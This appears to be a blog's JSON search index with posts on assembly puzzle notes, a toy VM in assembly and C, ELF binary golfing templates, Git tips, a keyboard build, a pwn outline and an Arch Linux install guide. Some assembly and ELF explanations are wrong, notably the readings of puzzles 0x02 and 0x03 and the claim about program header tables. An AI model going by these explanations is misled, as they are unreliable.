[{"categories":null,"content":"Forewords Note So recently a coworker of mine showed a book about assembly poems, at first I was like ‚Äúwell this joke is very funny‚Äù and then I read the first page. 5 minutes later I ordered the same book for my own, and now that it has been received, I want to write my notes here. There is an online and free version of the book. I will try to understand each 64 pages of this awesome work, in order to maintain my assembly knowledge and to learn new tricks. Of course I can be wrong in my interpretations of certain code or instructions, if so, feel free to help me improve! ","date":"2022-06-18","objectID":"/xchg-rax-rax/:1:0","tags":["assembly","low-level"],"title":"üîé xchg rax, rax","uri":"/xchg-rax-rax/"},{"categories":null,"content":"0x00 xor eax,eax lea rbx,[0] loop $ mov rdx,0 and esi,0 sub edi,edi push 0 pop rbp The first page is pretty straightforward. As you can see every line sets one register to 0. Every instruction here is very common and easy to understand, but one thing caught my attention: loop $. So let‚Äôs dig a bit here. loop \u003clabel\u003e can be resumed like so: loop: ; if cx == 0 jmp to end test cx, cx jnz $+3 dec cx jmp loop As you can see, it decrements cx at each iteration until it is 0. So a loop $ would simply set cx to 0, as the label to loop through is $, the symbol for the actual address. Normally with loop label you would have some code between label and the loop instruction, but here there is none, so the loop only decrements cx. Pretty sneaky trick. ","date":"2022-06-18","objectID":"/xchg-rax-rax/:2:0","tags":["assembly","low-level"],"title":"üîé xchg rax, rax","uri":"/xchg-rax-rax/"},{"categories":null,"content":"0x01 .loop: xadd rax,rdx loop .loop This one is a little trick and pretty obfuscated but was very quick to understand. In fact, this loop produces the fibonacci sequence for the first cx elements. As we learnt about loop at 0x00, it loops until cx equals 0, and here there is one instruction which gets exectued within the loop. xadd is quite uncommon, this instruction can be coded as: xadd: ; swap rax and rdx xchg rax, rdx ; rdx = rdx + rax mov r8, rdx add r8, rax mov rdx, r8 One experienced programmer can spot the algorithm to compute the fibonacci sequence here, which calculate the sum of the two previous elements of the sequence. ","date":"2022-06-18","objectID":"/xchg-rax-rax/:3:0","tags":["assembly","low-level"],"title":"üîé xchg rax, rax","uri":"/xchg-rax-rax/"},{"categories":null,"content":"0x02 neg rax sbb rax,rax neg rax This code was a bit tricky, after discussing with friends we agreed to say that this code tells if rax is different than 0. At first I said that it tells the sign of rax, but I missunderstood the sbb instruction, but I was wrong and overlooked the computing of the sbb rax, rax. This code requires to look at neg at first, despite of switching the sign of the target, it also sets the carry flag CF accordingly with the sign. We can now dig sbb, its code can be: sbb: ; rax is argv[0] ; rbx is argv[1] mov r8, rax add r8, CF sub rbx, r8 By looking at the possible output values, we van see that it is a substraction by either rax + 0 or rax + 1 of rbx. Given that in this code, we have sbb rax, rax, we can sse that we will only get rax = rax - (rax + CF), with CF at 0 or 1, thus the output of the instruction is either 0 or 1, corresponding to the initial sign of rax. ","date":"2022-06-18","objectID":"/xchg-rax-rax/:4:0","tags":["assembly","low-level"],"title":"üîé xchg rax, rax","uri":"/xchg-rax-rax/"},{"categories":null,"content":"0x03 sub rdx,rax sbb rcx,rcx and rcx,rdx add rax,rcx With the previous experiences we now know about all the above instructions, we can deduce the behaviour of the code, which can be coded in a more high-level language like Python: def my_func(rax, rdx): if rax \u003e rdx: rax += rdx Yes, this is that simple. The tricky part comes from the sbb and and part. sub rdx, rax stores the difference in rdx, and sets the CF if needed. sbb rcx, rcx sets rcx to neg CF (either 0 or 0xffffffff) and rcx, rdx If rax was lower than rdx at line 1: rcx would be 0 and then the and sill still set rcx to 0 If rax was greater than rdx at line 1: rcx would be 0xffffffff and so, rcx becomes the value of rdx add rax, rcx is trivial now So 0x03 adds rdx to rax if rax \u003e rdx. ","date":"2022-06-18","objectID":"/xchg-rax-rax/:5:0","tags":["assembly","low-level"],"title":"üîé xchg rax, rax","uri":"/xchg-rax-rax/"},{"categories":null,"content":"0x04 xor al,0x20 This code was pretty simple to test, I was unsure of the exact behaviour of it, so I tested it: for x in range(255): print(chr(x), chr(x ^ 0x20)) And as you can see by executing this code, the printable characters have their case swapped: lowercase letters become upperccase, and vice-versa. ","date":"2022-06-18","objectID":"/xchg-rax-rax/:6:0","tags":["assembly","low-level"],"title":"üîé xchg rax, rax","uri":"/xchg-rax-rax/"},{"categories":null,"content":"0x05 sub rax,5 cmp rax,4 ","date":"2022-06-18","objectID":"/xchg-rax-rax/:7:0","tags":["assembly","low-level"],"title":"üîé xchg rax, rax","uri":"/xchg-rax-rax/"},{"categories":["Custom VM"],"content":" Note This is the second part of my series about creating a custom virtual machine: part 1 - assembly VM. The code is here: https://github.com/OxNinja/C-VM ","date":"2022-05-09","objectID":"/c-vm/:0:0","tags":["c","low-level","reverse"],"title":"üîé Creating a VM for fun - Part 2: C","uri":"/c-vm/"},{"categories":["Custom VM"],"content":"Introduction Doing the PoC in assembly (see part 1) gave me enough information about how to create my own virtual machine, I got the basic concepts for such a subject, such as: Parsing opcode Emulating instruction Use of virtual registers It also showed me the limitations of this language, I needed a more sofisticated yet low level one, C was the perfect match ü•µ. ","date":"2022-05-09","objectID":"/c-vm/:1:0","tags":["c","low-level","reverse"],"title":"üîé Creating a VM for fun - Part 2: C","uri":"/c-vm/"},{"categories":["Custom VM"],"content":"Architecture I came with the following flow for the VM: ","date":"2022-05-09","objectID":"/c-vm/:2:0","tags":["c","low-level","reverse"],"title":"üîé Creating a VM for fun - Part 2: C","uri":"/c-vm/"},{"categories":["Custom VM"],"content":"PoC||GTFO Let‚Äôs break down how I created this VM. ","date":"2022-05-09","objectID":"/c-vm/:3:0","tags":["c","low-level","reverse"],"title":"üîé Creating a VM for fun - Part 2: C","uri":"/c-vm/"},{"categories":["Custom VM"],"content":"Registers In order to store information such as inputs or outputs, I needed some registers. These must be readable and writeable from anywhere in my program, I needed to make either a forbidden global variable, or create a local one which will be passed to the used functions. I went with the second solution, as it is less dirty, and I wanted to try my best by using pointers and C stuff. I created a struct for my registers: typedef struct Registers { // common operations registers int a, b, c, d; // array to work with when manipulating registers' indexes // each element will point to the address of the correspponding register // see `setup_registers()` for more details int *registers[4]; // flags are stored in one integer, using masks to extract them // remainder, zero (cmp) int flags; } Registers; I started to work with only 4 registers a, b, c, d and one for the flags after instruction‚Äôs execution. I also needed a way to (re)set the said registers to whatever I wanted, so I created this reset function: /* Set all registers in the array in order to easyliy manupulate them * like: regs-\u003eregisters[2] = 0x2a; * is the same as: regs-\u003ec = 0x2a; */ void setup_registers(Registers *regs) { // each element of the array points to the corresponding register's address regs-\u003eregisters[0] = \u0026regs-\u003ea; regs-\u003eregisters[1] = \u0026regs-\u003eb; regs-\u003eregisters[2] = \u0026regs-\u003ec; regs-\u003eregisters[3] = \u0026regs-\u003ed; } /* Just print the values */ void print_registers(Registers *regs) { printf(\"=== Registers: ===\\n\"); printf(\"a: 0x%x\\n\", regs-\u003ea); printf(\"b: 0x%x\\n\", regs-\u003eb); printf(\"c: 0x%x\\n\", regs-\u003ec); printf(\"d: 0x%x\\n\", regs-\u003ed); printf(\"flags: 0x%x\\n\", regs-\u003eflags); } /* Force the values of the registers to 0 */ void reset_registers(Registers *regs) { regs-\u003ea = 0; regs-\u003eb = 0; regs-\u003ec = 0; regs-\u003ed = 0; regs-\u003eflags = 0; } ","date":"2022-05-09","objectID":"/c-vm/:3:1","tags":["c","low-level","reverse"],"title":"üîé Creating a VM for fun - Part 2: C","uri":"/c-vm/"},{"categories":["Custom VM"],"content":"Emulation Emulating an instruction is very basic: Parse the input Detect the corresponding instruction Execute the instruction But I wanted to do something a bit fancy here: instead of just make a big 0xswitch statement, I created a map, or more precisely an array of pointers of functions. Meaning that each entry of the array is a pointer, pointing to the corresponding function to call: void emulate(Registers *regs, int shellcode) { // parsing the input to extract only the opcode int opcode = (shellcode \u0026 0xff000000) \u003e\u003e 0x18; // instructions is an array of pointers of function // each index points to the according function corresponding to the opcode // it is very easy to change the opcode for a certain function void (*instructions[10])(Registers *, int); // no opcode 0 defined for the moment instructions[1] = my_mov; instructions[2] = my_push; instructions[3] = my_add; instructions[4] = my_sub; instructions[5] = my_jmp; instructions[6] = my_cmp; instructions[7] = my_call; instructions[8] = my_exit; instructions[9] = my_pop; // code ommited for future spoilers redacted(); } Why this ‚Äúcrazy‚Äù stuff instead of the good old switch? You may ask. Well, for the sake of simplicity, yes, s i m p l i c i t y, I used this strategy for a good reason: // calling the corresponding function only takes 1 line of code, // and no processing at all: no if, nor loop (*instructions[opcode])(regs, shellcode); Then each function, such as my_mov and so, do the wanted behaviour of the corresponding instruction, for example: /* Moves the value into the register * value is either a register or a plain hex integer */ void my_mov(Registers *regs, int shellcode) { int is_reg1 = (shellcode \u0026 0x00f00000) \u003e\u003e 0x14; if (is_reg1 == 0x1) { // get index of target reg int target_reg = (shellcode \u0026 0x000f0000) \u003e\u003e 0x10; // get value to mov int is_reg2 = (shellcode \u0026 0x0000f000) \u003e\u003e 0xc; // get moved value int value = (shellcode \u0026 0x00000fff); // if source is a register and not a value if (is_reg2 == 0x1) { int source_reg = value \u003e\u003e 0x8; value = *regs-\u003eregisters[source_reg]; } // finally, move the value into the register *regs-\u003eregisters[target_reg] = value; } else { except(\"Invalid value for mov (arg a is not a register)\"); } } Which leads to my next subject: parsing. ","date":"2022-05-09","objectID":"/c-vm/:3:2","tags":["c","low-level","reverse"],"title":"üîé Creating a VM for fun - Part 2: C","uri":"/c-vm/"},{"categories":["Custom VM"],"content":"Parsing Yes, I did not mentionned how my instructions are encoded and how to parse them. See the following scheme to understand my way of crafting one instruction: opcode isReg1 value1 isReg2 value2 01 1 0 0 045 This instruction (0x1100045) is a mov a, 0x45. Yes this is a bit silly but here is an another scheme in order to better explain my way of encoding my instructions: And here is the size of each portion of the instruction: opcode: word isReg1: byte value1: byte if isReg1 == 1, any size else (depends on the instruction) isReg2: byte value2: byte if isReg2 == 1, any size else (depends on the instruction) I made the choice to use a constant-sized instruction set, to help me parsing each one, instead of having to hardcode every variant that a variable-length instruction set would require. Once this logic has been declared, there was one thing left to do: actually parsing the instructions. In fact, as you may have noticed in my instruction functions (my_mov() my_add()...), I used binary masking and shifting like so: (a \u0026\u0026 0xff) \u003e\u003e 0x10. ","date":"2022-05-09","objectID":"/c-vm/:3:3","tags":["c","low-level","reverse"],"title":"üîé Creating a VM for fun - Part 2: C","uri":"/c-vm/"},{"categories":["Custom VM"],"content":"Demo time I used the following code: int main(void) { // init the struct Registers regs; // setup the registers' array setup_registers(\u0026regs); // set everything to 0 reset_registers(\u0026regs); print_registers(\u0026regs); // mov a, 0x45 emulate(\u0026regs, 0x1100045); print_registers(\u0026regs); // mov c, 0x2 emulate(\u0026regs, 0x1120002); print_registers(\u0026regs); // exit(a) emulate(\u0026regs, 0x8000000); // yes, pointless return but it is for the personnal ethics return 0; } Thanks Special thanks to: Masterfox: for helping me debugging my issues with pointers and structs Nofix: for helping me debugging my array of pointers of functions stuff ","date":"2022-05-09","objectID":"/c-vm/:4:0","tags":["c","low-level","reverse"],"title":"üîé Creating a VM for fun - Part 2: C","uri":"/c-vm/"},{"categories":["Binary golfing"],"content":" So tmp.out - once again - got me. Especially netspooky, wich wrote about golfing binaries. Instantly I was caught in golfing. ","date":"2022-04-15","objectID":"/binary-golf/:0:0","tags":["binary","elf","golf","low-level"],"title":"üèåÔ∏è Binary golfing - Introduction","uri":"/binary-golf/"},{"categories":["Binary golfing"],"content":"Binary golfing? Crafting the smallest binary which does a particular task. Why someone would do this? Learn about binary executables and format parsers Flex on muggles ","date":"2022-04-15","objectID":"/binary-golf/:1:0","tags":["binary","elf","golf","low-level"],"title":"üèåÔ∏è Binary golfing - Introduction","uri":"/binary-golf/"},{"categories":["Binary golfing"],"content":"My notes on ELF format It is recommanded to code in assembly in order to manage your headers as you wish. We can handcraft binaries, because GCC is a bit messy when compiling code and linking stuff. We can then make sections or headers overlap to save more space. In brief, the section header table is for use by the compiler and linker, while the program header table is for use by the program loader. The program header table is optionnal and never present in practice, the section header table is also optional but always present. Brian Raiter, ‚ÄúA Whirlwind Tutorial on Creating Really Teensy ELF Executables for Linux‚Äù ","date":"2022-04-15","objectID":"/binary-golf/:2:0","tags":["binary","elf","golf","low-level"],"title":"üèåÔ∏è Binary golfing - Introduction","uri":"/binary-golf/"},{"categories":["Binary golfing"],"content":"Compile Classic way: nasm -f elf32 file.s ld -m elf_i386 -nmagic file.o -o bin Better: To directly craft a binary: nasm -f bin file.s. ","date":"2022-04-15","objectID":"/binary-golf/:2:1","tags":["binary","elf","golf","low-level"],"title":"üèåÔ∏è Binary golfing - Introduction","uri":"/binary-golf/"},{"categories":["Binary golfing"],"content":"Header The smallest valid header I can think of might be: 7f45 4c46 01?? ???? ???? ???? ???? ???? 0200 0300 0100 ???? dead beef 2c00 0000 ???? ???? ???? ???? 3400 2000 0100 0000 ???? ???? 0000 0008 0000 0008 !!!! !!!! !!!! !!!! 0500 0000 0010 0000 Considering the following: ??: garbage, so you can just use those bytes for shellcode !!!! !!!!: total size of the header, so it will depend on your code dead beef: address of the entrypoint Here is a template I modified from here, so all creds to the author: bits 32 org 0x8000000 ehdr: ; Elf32_Ehdr db 0x7F, \"ELF\", 1, 1, 1, 0 ; e_ident times 8 db 0 dw 2 ; e_type dw 3 ; e_machine dd 1 ; e_version dd _start ; e_entry dd phdr-$$ ; e_phoff dd 0 ; e_shoff dd 0 ; e_flags dw ehdrsize ; e_ehsize dw phdrsize ; e_phentsize dw 1 ; e_phnum dw 0 ; e_shentsize dw 0 ; e_shnum dw 0 ; e_shstrndx ehdrsize equ $-ehdr phdr: ; Elf32_Phdr dd 1 ; p_type dd 0 ; p_offset dd $$ ; p_vaddr dd $$ ; p_paddr dd filesize ; p_filesz dd filesize ; p_memsz dd 5 ; p_flags dd 0x1000 ; p_align phdrsize equ $-phdr _start: ; your program here filesize equ $-$$ And the version for 64 bits (taken from here): bits 64 org 0x8000000 ehdr: ; Elf64_Ehdr db 0x7F, \"ELF\", 2, 1, 1, 0 ; e_ident times 8 db 0 dw 2 ; e_type dw 62 ; e_machine dd 1 ; e_version dq _start ; e_entry dq phdr - $$ ; e_phoff dq 0 ; e_shoff dd 0 ; e_flags dw ehdrsize ; e_ehsize dw phdrsize ; e_phentsize dw 1 ; e_phnum dw 0 ; e_shentsize dw 0 ; e_shnum dw 0 ; e_shstrndx ehdrsize equ $-ehdr phdr: ; Elf64_Phdr dd 1 ; p_type dd 5 ; p_flags dq 0 ; p_offset dq $$ ; p_vaddr dq $$ ; p_paddr dq filesize ; p_filesz dq filesize ; p_memsz dq 0x1000 ; p_align phdrsize equ $-phdr _start: ; your code here filesize equ $-$$ ","date":"2022-04-15","objectID":"/binary-golf/:2:2","tags":["binary","elf","golf","low-level"],"title":"üèåÔ∏è Binary golfing - Introduction","uri":"/binary-golf/"},{"categories":["Binary golfing"],"content":"Unethical stuff Declaring variables in the wild üôà Nothing forbidens to declare variables anywhere, to save some space you can skip using the .rodata section. section .text var: db \"salut\", 0xa Use header as code section üß† Big brain move here: put code in the header ehdr: db 0x7f, \"ELF\" db 1, 1, 1, 0, 0 _start: mov bl, 42 xor eax, eax inc eax int 0x80 ;; continue the header dw 2 dw 3 dw 1 ;; ... ","date":"2022-04-15","objectID":"/binary-golf/:2:3","tags":["binary","elf","golf","low-level"],"title":"üèåÔ∏è Binary golfing - Introduction","uri":"/binary-golf/"},{"categories":["Binary golfing"],"content":"Golfing resources A while ago I created a repo containing some random assembly programs I did, I added my try to make a tiny Hello world binary: https://github.com/OxNinja/nasm_/tree/main/elf-golfing https://codegolf.stackexchange.com/questions/5696/shortest-elf-for-hello-world-n Create tiny ELF for Linux https://www.muppetlabs.com/~breadbox/software/tiny/ Analyzing ELF with malformed headers ","date":"2022-04-15","objectID":"/binary-golf/:2:4","tags":["binary","elf","golf","low-level"],"title":"üèåÔ∏è Binary golfing - Introduction","uri":"/binary-golf/"},{"categories":["Custom VM"],"content":"To make things short, I saw How to write a virtual machine in order to hide your viruses and break your brain forever by @s01den published in tmp.out‚Äôs second edition. This new paper made me enjoy (once again) low-level. I wanted to know more about this abstract subject of ‚Äúvirtual machines‚Äù in reverse engineering, so I read it and started to implement my own VM in assembly! You will find my code on my Github repo ","date":"2022-03-17","objectID":"/assembly-vm/:0:0","tags":["assembly","low-level","reverse"],"title":"üîé Creating a VM for fun - Part 1: ASM","uri":"/assembly-vm/"},{"categories":["Custom VM"],"content":"Why assembly? I wanted to understand everything I did during this process, and needed to stick with the lowest level I could, I will talk about the future of this project at the end of the post. I was also already familiar with assembly, especially nasm for Linux, and wanted to test my knowledge. ","date":"2022-03-17","objectID":"/assembly-vm/:1:0","tags":["assembly","low-level","reverse"],"title":"üîé Creating a VM for fun - Part 1: ASM","uri":"/assembly-vm/"},{"categories":["Custom VM"],"content":"Design Before staring to type very fast on my keyboard, I needed to put things on a paper, in order to have a clear overview of the project. I had to answer a few questions: What is an instruction? It‚Äôs like a function, or an alias to some code to execute How does the CPU knows what to do with an instruction? The code an instruction represents is written for the CPU, so it is seamless How can I make custom instructions? Just implemet some functions or code blocks, then map them to a custom ‚ÄúOPcode‚Äù How can I make the CPU execute my custom instructions? Make a simple condition on the custom OPcode, and execute the code mapped to it ","date":"2022-03-17","objectID":"/assembly-vm/:2:0","tags":["assembly","low-level","reverse"],"title":"üîé Creating a VM for fun - Part 1: ASM","uri":"/assembly-vm/"},{"categories":["Custom VM"],"content":"PoC ","date":"2022-03-17","objectID":"/assembly-vm/:3:0","tags":["assembly","low-level","reverse"],"title":"üîé Creating a VM for fun - Part 1: ASM","uri":"/assembly-vm/"},{"categories":["Custom VM"],"content":"Registers To (re)set registers, code is very straightforward and don‚Äôt really need explainations, right? reset_registers: push rbp mov rbp, rsp xor rax, rax xor rbx, rbx xor rcx, rcx xor rdx, rdx xor r8, r8 leave ret ","date":"2022-03-17","objectID":"/assembly-vm/:3:1","tags":["assembly","low-level","reverse"],"title":"üîé Creating a VM for fun - Part 1: ASM","uri":"/assembly-vm/"},{"categories":["Custom VM"],"content":"Instructions I decided to implement a very low amount of instructions, as I already plan to upgrade this project in the future. I only need a proof of concept before going big. OPcode Instruction NASM 0x1 mov a, b mov rbx, rcx 0x2 push a push rbx 0x3 add a, b add rbx, rcx 0x4 jmp a jmp rbx Yes, some very basic instructions. ","date":"2022-03-17","objectID":"/assembly-vm/:3:2","tags":["assembly","low-level","reverse"],"title":"üîé Creating a VM for fun - Part 1: ASM","uri":"/assembly-vm/"},{"categories":["Custom VM"],"content":"Execution The concept here is to compare rax, our opcode register and then call the corresponding function: ;; if opcode == 0x1: ;; mov_a_b() cmp rax, 0x1 je mov_a_b cmp rax, 0x2 je push_a cmp rax, 0x3 je add_a_b ;; and so on with every opcode call _exit ;; default if unrecognized opcode ","date":"2022-03-17","objectID":"/assembly-vm/:3:3","tags":["assembly","low-level","reverse"],"title":"üîé Creating a VM for fun - Part 1: ASM","uri":"/assembly-vm/"},{"categories":["Custom VM"],"content":"Future In a future post I will cover how to improve this VM, especially using a fully emulated virtual memory, using C. üòé ","date":"2022-03-17","objectID":"/assembly-vm/:4:0","tags":["assembly","low-level","reverse"],"title":"üîé Creating a VM for fun - Part 1: ASM","uri":"/assembly-vm/"},{"categories":["TL;DR"],"content":"Git üî• You want to use Git as a real chad developper? Let‚Äôs go - f a s t - then. ","date":"2021-10-17","objectID":"/tldr-git/:1:0","tags":["dev","git","tldr"],"title":"üöÄ TL;DR - Git","uri":"/tldr-git/"},{"categories":["TL;DR"],"content":"Basics Git is a decentralized versioning tool aimimg to help programmers following source code development. Track file changes Update remote code Work simultaneously with a lot of people Arrange your code organization Resources: https://www.freecodecamp.org/news/learn-the-basics-of-git-in-under-10-minutes-da548267cc91/ https://rogerdudler.github.io/git-guide/ https://lab.github.com/lmachens/git-and-github-first-timers ","date":"2021-10-17","objectID":"/tldr-git/:1:1","tags":["dev","git","tldr"],"title":"üöÄ TL;DR - Git","uri":"/tldr-git/"},{"categories":["TL;DR"],"content":"Create a new project From scratch git init From an empty repository git clone https://myrepo.org/project-0 # or with ssh (use your public key) git clone git@myrepo.org:username/project-0 ","date":"2021-10-17","objectID":"/tldr-git/:1:2","tags":["dev","git","tldr"],"title":"üöÄ TL;DR - Git","uri":"/tldr-git/"},{"categories":["TL;DR"],"content":"Do some modifications \"In your favorite editor\". Next line: vim ü§£ pic.twitter.com/vw7cqCOFFL ‚Äî Baptiste Robert (@fs0c131y) April 28, 2021 vim my_file.txt # haha ü§£ lol my favorite editor # add the file to the repository git add my_file.txt # change the name of the file git mv my_file.txt README.md # delete a file git rm README.md # commit your changes git commit -m 'My changes' # update the repository git push # if from scratch git remote add origin git@myrepo.org:username/project-0 git push -u origin master ","date":"2021-10-17","objectID":"/tldr-git/:1:3","tags":["dev","git","tldr"],"title":"üöÄ TL;DR - Git","uri":"/tldr-git/"},{"categories":["TL;DR"],"content":"Update your repository git pull ","date":"2021-10-17","objectID":"/tldr-git/:1:4","tags":["dev","git","tldr"],"title":"üöÄ TL;DR - Git","uri":"/tldr-git/"},{"categories":["TL;DR"],"content":"Advanced mechanics # create new branch and push it to repo git checkout -b my-branch vim ...; git add ...; git commit ... git push -u origin my-branch # tag a commit git tag -a v1.0 -m \"My description of the tag\" # merge my-branch into master git checkout master git merge my-branch git push # update your submodules git submodule update --remote --merge # delete a local commit git reset HEAD~ # modify a local commit git commit --amend # temporary discard your local changes git stash # config your git variables git config user.name PouetPouet # sign off a commit # some opensource project require you to sign your commits, see # https://stackoverflow.com/a/1962112 git commit -s -m \"My commit message\" # mutli authors git commit -m \"My commit message You can add co-authors to a commit by adding one line by author like so: (note the mandatory 2 empty lines) Co-authored-by: username \u003cuser@example.com\u003e\" ","date":"2021-10-17","objectID":"/tldr-git/:1:5","tags":["dev","git","tldr"],"title":"üöÄ TL;DR - Git","uri":"/tldr-git/"},{"categories":null,"content":"Why? Why not? ","date":"2021-10-02","objectID":"/build-your-own-keyboard/:1:0","tags":["diy","hardware"],"title":"ü™õ Build your own mechanical keyboard","uri":"/build-your-own-keyboard/"},{"categories":null,"content":"Components I bought all the parts on kbdfans.com, but you can find a lot of things on other websites. Be careful on the shipping tho! Part Product Comment Switches Gateron red linear, x70 Stabilizers Cherry Screw-in Stabs 60 set PCB KBD67 rev2 65% PCB RGB, VIA support, USB-C Plate Aluminium plate Backplate TADA68 Low Profile Aluminum Case Keycaps Generic caps Lube PCMasterrace lube Tip: buy a lube station and a switch disassembler for more confort ","date":"2021-10-02","objectID":"/build-your-own-keyboard/:2:0","tags":["diy","hardware"],"title":"ü™õ Build your own mechanical keyboard","uri":"/build-your-own-keyboard/"},{"categories":null,"content":"Switches First thing to do is to disassemble the switches and separate all the pieces for lubing. Ref: ","date":"2021-10-02","objectID":"/build-your-own-keyboard/:3:0","tags":["diy","hardware"],"title":"ü™õ Build your own mechanical keyboard","uri":"/build-your-own-keyboard/"},{"categories":null,"content":"Test the PCB We want to test our PCB if any pin is damaged or not working, I used the VIA software to check it. ","date":"2021-10-02","objectID":"/build-your-own-keyboard/:4:0","tags":["diy","hardware"],"title":"ü™õ Build your own mechanical keyboard","uri":"/build-your-own-keyboard/"},{"categories":null,"content":"Stabilzers Trim the useless feet of the stabilizers for better stability and less noise. Before After Now we will lube the stabs and place them on the PCB. Ref: ","date":"2021-10-02","objectID":"/build-your-own-keyboard/:5:0","tags":["diy","hardware"],"title":"ü™õ Build your own mechanical keyboard","uri":"/build-your-own-keyboard/"},{"categories":null,"content":"Soldering We now want to solder the switches to the PCB. Ref: ","date":"2021-10-02","objectID":"/build-your-own-keyboard/:6:0","tags":["diy","hardware"],"title":"ü™õ Build your own mechanical keyboard","uri":"/build-your-own-keyboard/"},{"categories":null,"content":"Finish Put the keycaps on it and you got your brand new handmade keyboard. ","date":"2021-10-02","objectID":"/build-your-own-keyboard/:7:0","tags":["diy","hardware"],"title":"ü™õ Build your own mechanical keyboard","uri":"/build-your-own-keyboard/"},{"categories":null,"content":"Sound testing Sorry for bad quality Keyboard Sound Ducky One 2 (MX brown) mp3 Keychron k3 (MX brown lubed) mp3 Mine (Gatheron red lubed) mp3 ","date":"2021-10-02","objectID":"/build-your-own-keyboard/:8:0","tags":["diy","hardware"],"title":"ü™õ Build your own mechanical keyboard","uri":"/build-your-own-keyboard/"},{"categories":null,"content":"Configure keyboard with VIA VIA is an open source software to help you configure your keyboard: adding layers (like Fn key), macros and so on. I used it in order to add a function on my right control key, to unlock a new layer on the keyboard, I can now use F1-F10 keys easily. ","date":"2021-10-02","objectID":"/build-your-own-keyboard/:9:0","tags":["diy","hardware"],"title":"ü™õ Build your own mechanical keyboard","uri":"/build-your-own-keyboard/"},{"categories":null,"content":" There are a lot of high quality articles about pwn, but I want to share my experience and thus find my mistakes and complete my knowledge. Enjoy. üîß work in progress ","date":"2021-09-01","objectID":"/start-pwn/:0:0","tags":["notes","pwn"],"title":"You want to start to `pwn`?","uri":"/start-pwn/"},{"categories":null,"content":"pwn? Refering to the ‚Äòbinary exploitation‚Äô category, pwn is about exploiting weaknesses in low-level and bad code issues. For exemple corrupting the memory if a program does not sanitise the user input. ","date":"2021-09-01","objectID":"/start-pwn/:1:0","tags":["notes","pwn"],"title":"You want to start to `pwn`?","uri":"/start-pwn/"},{"categories":null,"content":"Buffer overflow ","date":"2021-09-01","objectID":"/start-pwn/:2:0","tags":["notes","pwn"],"title":"You want to start to `pwn`?","uri":"/start-pwn/"},{"categories":null,"content":"Theory Re-write memory on the fly. ","date":"2021-09-01","objectID":"/start-pwn/:2:1","tags":["notes","pwn"],"title":"You want to start to `pwn`?","uri":"/start-pwn/"},{"categories":null,"content":"Practice ","date":"2021-09-01","objectID":"/start-pwn/:2:2","tags":["notes","pwn"],"title":"You want to start to `pwn`?","uri":"/start-pwn/"},{"categories":null,"content":"ROP ","date":"2021-09-01","objectID":"/start-pwn/:3:0","tags":["notes","pwn"],"title":"You want to start to `pwn`?","uri":"/start-pwn/"},{"categories":null,"content":"Theory Use ‚Äòcode‚Äô in the binary to chain small instructions and re-write data. ","date":"2021-09-01","objectID":"/start-pwn/:3:1","tags":["notes","pwn"],"title":"You want to start to `pwn`?","uri":"/start-pwn/"},{"categories":null,"content":"Practice ","date":"2021-09-01","objectID":"/start-pwn/:3:2","tags":["notes","pwn"],"title":"You want to start to `pwn`?","uri":"/start-pwn/"},{"categories":null,"content":"ret2libc ","date":"2021-09-01","objectID":"/start-pwn/:4:0","tags":["notes","pwn"],"title":"You want to start to `pwn`?","uri":"/start-pwn/"},{"categories":null,"content":"Theory Use ROP to execute code, use compiled libc in the binary to jump to any libc function. Usefull to get a shell. ","date":"2021-09-01","objectID":"/start-pwn/:4:1","tags":["notes","pwn"],"title":"You want to start to `pwn`?","uri":"/start-pwn/"},{"categories":null,"content":"Practice ","date":"2021-09-01","objectID":"/start-pwn/:4:2","tags":["notes","pwn"],"title":"You want to start to `pwn`?","uri":"/start-pwn/"},{"categories":null,"content":"Resources StartingPwnt StartingPwnt solutions ","date":"2021-09-01","objectID":"/start-pwn/:5:0","tags":["notes","pwn"],"title":"You want to start to `pwn`?","uri":"/start-pwn/"},{"categories":null,"content":" ‚ö†Ô∏è Now Archlinux embeeds an install script which you can run with archinstall, this blog post is here for curious people wanting to know how to install things from scratch and know how a Linux system works. I recently installed Archlinux on my laptop, let me help you for a fresh new install, step by step, with all commands and tips I learnt. After closing around 30-40 navigation pages on my phone after every new installation, I decided to take notes of my mistakes and the tips I learnt of my past experiences in this post. Disclaimer: I based all my previous installations on the following, therefor some content will be very similar, if not the same. https://archlinux.org/ https://wiki.archlinux.fr/installation https://github.com/FredBezies/arch-tuto-installation/blob/master/install.md (üá´üá∑) https://driikolu.fr/2020/03/install_arch_chiffre_uefi/ (üá´üá∑) I recommend to read the tips if you have an issue with something (Ctrl-f should work), or want to learn a bit more. ","date":"2021-08-18","objectID":"/install-archlinux/:0:0","tags":["archlinux","tutorial"],"title":"How to install Archlinux","uri":"/install-archlinux/"},{"categories":null,"content":"Archlinux I really love the minimalist mindset of Archlinux: install only what you need and what you want. You need to change something in particular? You know how to do it because you learnt how to install it before. You are in total control of your installation and can customize it as needed. Without mentioning the AUR packages. ","date":"2021-08-18","objectID":"/install-archlinux/:1:0","tags":["archlinux","tutorial"],"title":"How to install Archlinux","uri":"/install-archlinux/"},{"categories":null,"content":"Bootable USB The first thing to get is a USB stick to make it bootable and store the ISO on it. sudo dd bs=4M if=/path/to/archlinux.iso of=/dev/sdX # sdX is your USB stick (see lsblk) After some time, you get your USB bootable. Boot your computer on it to install Archlinux. ‚ö†Ô∏è I have an Nvidia graphics card (too recent to be supported) and needed to add the nomodeset flag on boot because of screen glitches. ","date":"2021-08-18","objectID":"/install-archlinux/:2:0","tags":["archlinux","tutorial"],"title":"How to install Archlinux","uri":"/install-archlinux/"},{"categories":null,"content":"Base system ","date":"2021-08-18","objectID":"/install-archlinux/:3:0","tags":["archlinux","tutorial"],"title":"How to install Archlinux","uri":"/install-archlinux/"},{"categories":null,"content":"Partitions We first want to create our partitions. Make sure to get your disk label with fdisk -l. We will create 4 partitions: Partition Name Type Size Mount point /dev/sdX1 EFI FAT32 128MiB /mnt/boot/efi /dev/sdX2 Boot ext4 256MiB /mnt/boot /dev/sdX3 Root ext4 32GiB /mnt /dev/sdX4 Home ext4 Everything else /mnt/home Those values are arbitrary, change them at your own risks. # partitions parted /dev/sdX mklabel gpt # EFI mkpart primary fat32 1MiB 129MiB # 128MiB size set 1 esp on # Boot mkpart primary ext4 129MiB 385MiB # 256MiB size set 2 boot on # Root mkpart primary ext4 385MiB 32.4GiB # 32GiB size # Home mkpart primary ext4 32.4GiB 100% # take everything else q Create filesystem on the partitions: mkfs.fat -F32 /dev/sdX1 for i in {2..4}; do mkfs.ext4 /dev/sdX$i; done # oneliner # or mkfs.ext4 /dev/sdX2 mkfs.ext4 /dev/sdX3 mkfs.ext4 /dev/sdX4 